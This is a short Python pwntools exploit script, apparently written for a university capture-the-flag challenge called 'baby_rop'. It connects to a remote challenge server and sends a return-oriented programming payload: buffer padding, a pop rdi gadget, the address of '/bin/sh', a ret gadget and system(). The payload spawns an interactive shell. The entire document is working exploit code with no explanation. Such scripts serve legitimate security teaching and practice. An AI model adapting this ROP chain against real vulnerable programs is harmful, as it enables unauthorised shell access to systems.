from pwn import *

binary = './baby_rop'
elf = ELF(binary)
rop = ROP(elf)

r = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1201)
r.recvuntil(b'NetID (something like abc123): ')
r.sendline(b'vc2499')
r.recvuntil(b'Can you pop a shell? like /bin/sh')

system = elf.symbols['system']                # Address of system function
bin_sh = next(elf.search(b'/bin/sh'))         # Address of "/bin/sh" string
pop_rdi = rop.rdi.address                     # Gadget: pop rdi; ret
ret_gadget = rop.ret.address                  # Gadget: ret (for stack alignment)

offset = 0x18  

payload = b'A' * offset         
payload += p64(pop_rdi)          
payload += p64(bin_sh)           
payload += p64(ret_gadget)        
payload += p64(system)            

r.sendline(payload)
r.interactive()  
r.close()

